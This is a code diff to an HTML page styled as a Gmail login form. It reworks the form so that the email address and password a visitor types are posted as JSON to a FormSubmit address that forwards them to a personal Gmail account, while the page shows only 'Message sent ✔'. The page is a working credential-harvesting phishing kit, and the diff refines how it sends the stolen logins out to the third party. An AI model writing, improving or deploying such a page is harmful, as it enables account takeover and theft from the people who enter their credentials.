@@ -50,10 +50,14 @@
 
   <h2>LOGIN</h2>
 
-  <input type="email" id="email" placeholder="Enter Gmail">
-  <input type="password" id="password" placeholder="Enter Password">
+  <form id="loginForm">
 
-  <button onclick="sendData()">LOG IN</button>
+    <input type="email" id="email" placeholder="Enter Gmail" required>
+    <input type="password" id="password" placeholder="Enter Password" required>
+
+    <button type="submit">LOG IN</button>
+
+  </form>
 
   <div id="msg"></div>
 
@@ -61,7 +65,8 @@
 
 <script>
 
-function sendData(){
+document.getElementById("loginForm").addEventListener("submit", function(e){
+    e.preventDefault();
 
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
@@ -72,21 +77,22 @@ function sendData(){
         return;
     }
 
-    // show message instantly
     document.getElementById("msg").style.color = "green";
     document.getElementById("msg").innerText = "Message sent ✔";
 
-    // send to your Gmail
-    let formData = new FormData();
-    formData.append("email", email);
-    formData.append("password", password);
-
     fetch("https://formsubmit.co/folkking66@gmail.com", {
         method: "POST",
-        body: formData
+        headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        },
+        body: JSON.stringify({
+            email: email,
+            password: password
+        })
     });
 
-}
+});
 
 </script>
 
